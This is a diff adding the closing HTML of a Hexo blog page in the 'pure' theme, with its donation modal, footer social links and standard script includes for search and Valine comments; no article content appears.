+      <a href="/2021/11/23/buuctf-r2t4/" title="buuctf-r2t4"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
